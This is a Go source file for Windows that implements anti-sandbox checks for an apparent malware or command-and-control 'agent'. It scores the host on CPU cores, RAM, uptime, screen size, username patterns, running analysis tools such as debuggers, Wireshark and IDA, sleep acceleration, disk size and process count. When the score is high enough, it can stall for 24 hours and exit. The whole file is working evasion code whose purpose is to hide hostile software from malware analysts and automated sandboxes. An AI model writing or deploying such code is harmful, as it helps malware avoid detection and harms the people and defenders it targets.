//go:build windows

package main

import (
	"fmt"
	"os"
	"runtime"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// known sandbox/analysis process names (lowercase)
var sandboxProcList = []string{
	"vboxservice.exe", "vboxtray.exe",
	"vmwaretray.exe", "vmwareuser.exe", "vmtoolsd.exe", "vmacthlp.exe",
	"wireshark.exe", "dumpcap.exe",
	"processhacker.exe", "procmon.exe", "procmon64.exe", "procexp.exe", "procexp64.exe",
	"filemon.exe", "regmon.exe", "autoruns.exe", "autorunsc.exe",
	"x32dbg.exe", "x64dbg.exe", "windbg.exe",
	"idaq.exe", "idaq64.exe", "idaw.exe", "idat.exe",
	"ollydbg.exe", "immunity debugger.exe",
	"fiddler.exe", "charles.exe",
	"cuckoo.exe", "sandboxie.exe", "sbiesvc.exe",
	"df5serv.exe", "joeboxserver.exe", "joeboxcontrol.exe",
	"python.exe", "pythonw.exe", // common in auto-analysis rigs
}

// suspected sandbox usernames (lowercase, partial match)
var sandboxUsernames = []string{
	"sandbox", "malware", "virus", "tester", "test",
	"analysis", "analyst", "sample", "cuckoo", "joe",
}

type memStatusEx struct {
	dwLength                uint32
	dwMemoryLoad            uint32
	ullTotalPhys            uint64
	ullAvailPhys            uint64
	ullTotalPageFile        uint64
	ullAvailPageFile        uint64
	ullTotalVirtual         uint64
	ullAvailVirtual         uint64
	ullAvailExtendedVirtual uint64
}

var (
	kernel32SB              = windows.NewLazySystemDLL("kernel32.dll")
	user32SB                = windows.NewLazySystemDLL("user32.dll")
	procGlobalMemStatus     = kernel32SB.NewProc("GlobalMemoryStatusEx")
	procGetTickCount64SB    = kernel32SB.NewProc("GetTickCount64")
	procGetSystemMetricsSB  = user32SB.NewProc("GetSystemMetrics")
)

const (
	smCxScreen = 0
	smCyScreen = 1
)

// sandboxCheck runs all heuristics and returns a score (0–10) and indicator list.
// Score ≥ 3 is treated as "likely sandbox/VM/analysis environment".
func sandboxCheck() (score int, indicators []string) {
	// 1. CPU core count
	if runtime.NumCPU() < 2 {
		score++
		indicators = append(indicators, fmt.Sprintf("CPU cores: %d (< 2)", runtime.NumCPU()))
	}

	// 2. Physical RAM
	var ms memStatusEx
	ms.dwLength = uint32(unsafe.Sizeof(ms))
	procGlobalMemStatus.Call(uintptr(unsafe.Pointer(&ms)))
	if ms.ullTotalPhys > 0 && ms.ullTotalPhys < 4*1024*1024*1024 {
		score++
		indicators = append(indicators, fmt.Sprintf("RAM: %d MB (< 4 GB)", ms.ullTotalPhys/1024/1024))
	}

	// 3. System uptime
	ticks, _, _ := procGetTickCount64SB.Call()
	uptimeMin := int(ticks / 1000 / 60)
	if uptimeMin < 10 {
		score++
		indicators = append(indicators, fmt.Sprintf("uptime: %d min (< 10 min)", uptimeMin))
	}

	// 4. Screen resolution
	w, _, _ := procGetSystemMetricsSB.Call(smCxScreen)
	h, _, _ := procGetSystemMetricsSB.Call(smCyScreen)
	if (w > 0 && w < 800) || (h > 0 && h < 600) {
		score++
		indicators = append(indicators, fmt.Sprintf("screen: %dx%d (suspicious)", w, h))
	}

	// 5. Username heuristic
	user := strings.ToLower(os.Getenv("USERNAME"))
	for _, bad := range sandboxUsernames {
		if strings.Contains(user, bad) {
			score++
			indicators = append(indicators, fmt.Sprintf("username: %q matches sandbox pattern", user))
			break
		}
	}

	// 6. Sandbox process detection
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err == nil {
		defer windows.CloseHandle(snap)
		var entry windows.ProcessEntry32
		entry.Size = uint32(unsafe.Sizeof(entry))
		if windows.Process32First(snap, &entry) == nil {
			for {
				pname := strings.ToLower(windows.UTF16ToString(entry.ExeFile[:]))
				for _, bad := range sandboxProcList {
					if pname == bad {
						score += 2
						indicators = append(indicators, fmt.Sprintf("process: %s", pname))
					}
				}
				if windows.Process32Next(snap, &entry) != nil {
					break
				}
			}
		}
	}

	// 7. Sleep acceleration test — sandboxes often fast-forward Sleep() to speed analysis
	before := time.Now()
	time.Sleep(500 * time.Millisecond)
	elapsed := time.Since(before)
	if elapsed < 350*time.Millisecond {
		score += 2
		indicators = append(indicators, fmt.Sprintf("sleep accelerated: %dms instead of 500ms", elapsed.Milliseconds()))
	}

	// 8. Disk size
	cRoot, _ := windows.UTF16PtrFromString(`C:\`)
	var freeAvail, totalBytes, totalFree uint64
	_ = windows.GetDiskFreeSpaceEx(cRoot, &freeAvail, &totalBytes, &totalFree)
	if totalBytes > 0 && totalBytes < 60*1024*1024*1024 {
		score++
		indicators = append(indicators, fmt.Sprintf("disk: %d GB (< 60 GB)", totalBytes/1024/1024/1024))
	}

	// 9. Number of running processes (sandbox setups often have very few)
	procCount := 0
	snap2, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err == nil {
		defer windows.CloseHandle(snap2)
		var e2 windows.ProcessEntry32
		e2.Size = uint32(unsafe.Sizeof(e2))
		if windows.Process32First(snap2, &e2) == nil {
			for {
				procCount++
				if windows.Process32Next(snap2, &e2) != nil {
					break
				}
			}
		}
	}
	if procCount > 0 && procCount < 20 {
		score++
		indicators = append(indicators, fmt.Sprintf("process count: %d (< 20)", procCount))
	}

	return score, indicators
}

// antiSandbox runs the sandbox check and returns a report.
// If stall=true and a sandbox is detected, the agent sleeps for 24 hours then exits.
func antiSandbox(stall bool) (string, error) {
	score, indicators := sandboxCheck()

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[sandbox] score: %d/12\n", score))

	if len(indicators) == 0 {
		sb.WriteString("[sandbox] no indicators — looks like a real system\n")
	} else {
		sb.WriteString(fmt.Sprintf("[sandbox] %d indicator(s) detected:\n", len(indicators)))
		for _, ind := range indicators {
			sb.WriteString(fmt.Sprintf("  ⚠  %s\n", ind))
		}
	}

	if score >= 3 {
		sb.WriteString(fmt.Sprintf("\n[sandbox] VERDICT: likely SANDBOX/VM (score %d ≥ 3)\n", score))
		if stall {
			sb.WriteString("[sandbox] stalling — agent will sleep 24h then exit")
			go func() {
				time.Sleep(24 * time.Hour)
				os.Exit(0)
			}()
		}
	} else {
		sb.WriteString(fmt.Sprintf("\n[sandbox] VERDICT: likely real system (score %d < 3)", score))
	}

	return sb.String(), nil
}
